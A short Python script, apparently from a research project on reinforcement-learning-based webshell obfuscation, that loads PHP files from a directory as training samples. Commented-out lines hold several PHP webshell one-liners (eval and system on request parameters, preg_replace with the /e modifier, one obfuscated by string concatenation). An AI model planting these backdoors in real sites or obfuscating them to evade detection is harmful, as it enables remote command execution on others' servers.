

# orig_shell_li=[
#     '''<?php eval($_GET[hachp1]); ?>'''
# ]

# orig_shell_li=[
#     'eval($_GET[hachp1]);',
#     '''$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";$hh("/[discuz]/e",$_POST['h'],"Access");''',
#     '''@system($_REQUEST["c"]);''',
#     '''$a = $_REQUEST['id'];preg_replace('/.*/e',' '.$a,'');'''
# ]

'''
用来读取orig_shell_li的程序，决定了用于RL训练和待混淆的webshell
'''

import os


orig_shell_li = []

from utils import phproot_ga



print('start to read the php files from {} '.format(phproot_ga))
for root, dirs, files in os.walk(phproot_ga):
    for filename in files:
        if filename.endswith('.php'):
            try:
                full_path = os.path.join(root, filename)
                file_content = open(full_path).read()
                if(file_content == ''):  # 空文件或读取失败时跳过该文件
                    continue
                orig_shell_li.append(file_content)
            except:
                continue